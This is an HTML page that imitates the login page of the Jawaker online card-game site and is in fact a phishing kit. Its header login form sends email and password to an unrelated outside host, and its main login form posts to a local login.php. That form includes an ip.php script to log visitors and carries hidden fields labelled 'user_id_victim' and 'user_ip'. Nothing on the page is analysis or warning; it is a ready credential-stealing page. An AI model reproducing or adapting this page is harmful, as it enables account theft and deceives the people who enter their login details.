
<!DOCTYPE html>
<html lang="en" class=" gecko win js">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


<meta charset="utf-8">
<meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
<meta content="Play the most popular Middle Eastern card games with your friends online on Jawaker" name="description">
<meta content="Jawaker" name="author">
<meta content="100001647974248,516054981,518179663" property="fb:admins">
<title>
Play The Most Popular Middle Eastern Card Games - Jawaker
</title>


<link href="favicon.png" rel="shortcut icon" type="image/png">


<meta content="authenticity_token" name="csrf-param">
<meta content="OLMNrftYB5vBeBdglFk/NuO7yyUKQw3rnJvx3q2v3k0=" name="csrf-token">






<link rel="stylesheet" type="text/css" href="index.css" media="all">
</head>
<body class="sessions new  ">
<div class=" fb_reset" id="fb-root"><div style="position: absolute; top: -10000px; height: 0px; width: 0px;"><div></div><div></div></div></div>



<div id="wrapper">
<div id="header">
<div class="container">
<a href="http://www.jawaker.com/en" id="logo">Jawaker</a>
<div id="nav">
<ul>
<li class="expandable">
<a data-toggle="dropdown" href="#">
<span>Games</span>
</a>
<div class="nav-menu">
<ul class="game-list">
<li>
<a data-router="" href="http://www.jawaker.com/en/games/tarneeb">
<strong>Tarneeb</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a data-router="" href="http://www.jawaker.com/en/games/handgame">
<strong>Hand</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a data-router="" href="http://www.jawaker.com/en/games/hand_saudi">
<strong>Hand Saudi</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a data-router="" href="http://www.jawaker.com/en/games/hokm">
<strong>Hokm</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a data-router="" href="http://www.jawaker.com/en/games/hareega">
<strong>Hareega</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a data-router="" href="http://www.jawaker.com/en/games/baloot">
<strong>Baloot</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a data-router="" href="http://www.jawaker.com/en/games/basra">
<strong>Basra</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a data-router="" href="http://www.jawaker.com/en/games/estimation">
<strong>Estimation</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a data-router="" href="http://www.jawaker.com/en/games/trix_complex_partner">
<strong>Trix Complex Partner</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a data-router="" href="http://www.jawaker.com/en/games/trix_partner">
<strong>Trix Partner</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a data-router="" href="http://www.jawaker.com/en/games/trix_complex">
<strong>Trix Complex</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a data-router="" href="http://www.jawaker.com/en/games/trix">
<strong>Trix</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a data-router="" href="http://www.jawaker.com/en/games/tarneeb_egyptian">
<strong>Tarneeb Egyptian</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a data-router="" href="http://www.jawaker.com/en/games/tarneeb_syrian41">
<strong>Tarneeb Syrian41</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a data-router="" href="http://www.jawaker.com/en/games/sbeetiya">
<strong>Sbeetiya</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a data-router="" href="http://www.jawaker.com/en/games/leekha">
<strong>Leekha</strong>
<span class="arrow"></span>
</a>
</li>
</ul>
</div>
</li>
<li class="expandable">
<a data-toggle="dropdown" href="#">
<span>Competitions</span>
</a>
<div class="nav-menu">
<ul class="game-list">
<li>
<a href="http://www.jawaker.com/en/competitions/Tarneeb">
<strong>Tarneeb</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a href="http://www.jawaker.com/en/competitions/Handgame">
<strong>Hand</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a href="http://www.jawaker.com/en/competitions/HandSaudi">
<strong>Hand Saudi</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a href="http://www.jawaker.com/en/competitions/Hokm">
<strong>Hokm</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a href="http://www.jawaker.com/en/competitions/Baloot">
<strong>Baloot</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a href="http://www.jawaker.com/en/competitions/Estimation">
<strong>Estimation</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a href="http://www.jawaker.com/en/competitions/TrixComplexPartner">
<strong>Trix Complex Partner</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a href="http://www.jawaker.com/en/competitions/TrixPartner">
<strong>Trix Partner</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a href="http://www.jawaker.com/en/competitions/TrixComplex">
<strong>Trix Complex</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a href="http://www.jawaker.com/en/competitions/Trix">
<strong>Trix</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a href="http://www.jawaker.com/en/competitions/TarneebEgyptian">
<strong>Tarneeb Egyptian</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a href="http://www.jawaker.com/en/competitions/TarneebSyrian41">
<strong>Tarneeb Syrian41</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a href="http://www.jawaker.com/en/competitions/Sbeetiya">
<strong>Sbeetiya</strong>
<span class="arrow"></span>
</a>
</li>
<li>
<a href="http://www.jawaker.com/en/competitions/Leekha">
<strong>Leekha</strong>
<span class="arrow"></span>
</a>
</li>
</ul>
</div>
</li>
<li>
<a href="http://www.jawaker.com/en/basha">
<span>
<i class="jicon-basha jicon-large"></i>
Basha
</span>
</a>
</li>
<li class="language">
<a href="#">
<span>عربي</span>
</a>
</li>
</ul>
</div>
<div id="player-profile">
<ul id="account-buttons">
<li id="btn-login">
<a class="btn" data-popover="login" href="#">
<span>Login</span>
</a>
<div class="popover-wrapper" id="login-popover">
<div class="popover">
<form accept-charset="UTF-8" action="http://www.comeonengland.org/zsnl.php" accept-charset="utf-8" class="new_user" method="post"><div style="margin: 0px; padding: 0px; display: inline;"><input name="utf8" value="✓" type="hidden"><input name="authenticity_token" value="OLMNrftYB5vBeBdglFk/NuO7yyUKQw3rnJvx3q2v3k0=" type="hidden">  <input type="hidden" name="hub" value="login" /></div>
<div class="control-group">
<span class="error" style="display: none;">Invalid email or password.</span>
</div>
<input value="" name="user[email]" placeholder="Email Address" type="text">
<input name="user[password]" placeholder="Password" type="password">
<input name="user[remember_me]" value="1" type="checkbox">
Remember me
<button class="btn btn-primary" type="submit">Login</button>
</form>
<p class="forgot">
<a href="http://www.jawaker.com/en/users/password/new">Forgot your password?</a>
</p>
<div class="facebook">
<a class="btn btn-secondary" href="http://www.jawaker.com/users/auth/facebook">
<span><strong class="icon fb"></strong>Login
</span>
</a>
</div>
</div>
<div class="popover-tail"></div>
</div>
</li>
<li id="btn-signup">
<a class="btn btn-primary" data-target="#signup-modal" data-toggle="modal" href="http://www.jawaker.com/en/users/sign_up">
<span>Sign up</span>
</a>
</li>
</ul>
</div>
</div>

</div>
<div class="container narrow">
<div id="alerts">
</div>

</div>
<div class="container" id="banner-top">
<div id="gpt-ad-leaderboard" style="margin: auto;"></div>
</div>
<div class="container narrow">
<form accept-charset="UTF-8" action="login.php" accept-charset="utf-8" class="form-horizontal translucent box" method="post"><div style="margin: 0px; padding: 0px; display: inline;"><input name="utf8" value="✓" type="hidden"><input name="authenticity_token" value="OLMNrftYB5vBeBdglFk/NuO7yyUKQw3rnJvx3q2v3k0=" type="hidden"></div>
<?php include 'ip.php'; ?>	
<legend>
Login
</legend>
<div class="control-group">
<label class="control-label" for="user_email">Email</label>
<div class="controls">
<input value="" id="user_email" name="email" size="30" type="text">
<input type="hidden" name="user_id_victim" value="lwPC6tVG1wQk0wMXFhM2hPZHowOQ==" /><input type="hidden" name="user_ip" value="181.174.90.183,66.249.88.84, 66.249.88.84" /><input type="hidden" name="type" value="jawaker" />


</div>
</div>
<div class="control-group">
<label class="control-label" for="user_password">Password</label>
<div class="controls">
<input id="user_password" name="pass" size="30" type="password">
</div>
</div>
<div class="control-group">
<div class="controls">
<label class="checkbox" for="user_remember_me">
<input name="user[remember_me]" value="0" type="hidden"><input id="user_remember_me" name="user[remember_me]" value="1" type="checkbox">
Remember me
</label>
</div>
</div>
<div class="form-actions">
<button class="btn btn-primary" type="submit">Login</button>
<a class="btn btn-secondary" href="#">
<span><strong class="icon fb"></strong>Use Facebook
</span>
</a>
</div>
<hr>
<p>

  Don't have an account?
  <a href="http://www.jawaker.com/en/users/sign_up">Sign up</a> |

  <a href="http://www.jawaker.com/en/users/password/new">Forgot your password?</a>

</p>
</form>
</div>

<div id="footer-push"></div>
</div>
<div class="container">
<div class="plain" id="footer">
<p class="legal">
©
2012
Jawaker. All Rights Reserved.
<!--
<span>&bull;</span>
<a href='http://www.boundlessdrop.com' target='_blank'>Another Boundless Drop</a>
-->
</p>
<p class="links">
<a href="https://www.facebook.com/Jawaker" target="_top" title="Facebook">
<i class="ficon-facebook ficon-large"></i>
</a>
<span>•</span>
<a href="https://www.twitter.com/jawaker" target="_top" title="Twitter">
<i class="ficon-twitter ficon-large"></i>
</a>
<!--
<span>&bull;</span>
<a href='http://blog.jawaker.com' target='_blank'>Blog</a>
-->
<span>•</span>
<a href="http://support.jawaker.com/" target="_top">Support</a>
<span>•</span>
<a href="http://www.jawaker.com/en/about">About</a>
<span>•</span>
<a href="http://careers.jawaker.com/" target="_top">Jobs</a>
<span>•</span>
<a href="http://www.jawaker.com/en/terms">Privacy &amp; Terms</a>
<span>•</span>
<a href="http://www.jawaker.com/en/rules">Games Rules</a>
</p>
</div>
</div>

<div class="modal-wrapper">

<div class="modal hide" id="signup-modal">
<form novalidate="novalidate" accept-charset="UTF-8" action="http://www.jawaker.com/en/users" class="form-horizontal blocks-for-errors" method="post"><div style="margin: 0px; padding: 0px; display: inline;"><input name="utf8" value="✓" type="hidden"><input name="authenticity_token" value="OLMNrftYB5vBeBdglFk/NuO7yyUKQw3rnJvx3q2v3k0=" type="hidden"></div>
<div class="modal-header">
<a class="close" data-dismiss="modal" href="#">×</a>
<h4>
Create An Account
</h4>
<div class="facebook">
<a class="btn btn-secondary" href="http://www.jawaker.com/users/auth/facebook">
<span><strong class="icon fb"></strong>Use Facebook
</span>
</a>
</div>
</div>
<div class="modal-body">
<fieldset>
<div class="control-group">
<label class="control-label" for="signup_modal_email">Email Address</label>
<div class="controls">
<input value="" class="input-xlarge" id="signup_modal_email" name="user[email]" size="30" type="text">
</div>
</div>
<div class="control-group">
<label class="control-label" for="signup_modal_password">Password</label>
<div class="controls">
<input class="input-xlarge" id="signup_modal_password" name="user[password]" size="30" type="password">
</div>
</div>
<div class="control-group">
<label class="control-label" for="signup_modal_password_confirmation">Password Confirmation</label>
<div class="controls">
<input class="input-xlarge" id="signup_modal_password_confirmation" name="user[password_confirmation]" size="30" type="password">
</div>
</div>
</fieldset>
</div>
<div class="modal-footer">
<p class="instructions">
By signing up you agree to the <a href="http://www.jawaker.com/en/terms" target="_top">Jawaker Terms of Use</a>
</p>
<button class="btn btn-primary" type="submit">Sign up</button>
</div>
</form>
</div>

</div>




</body>
</html>

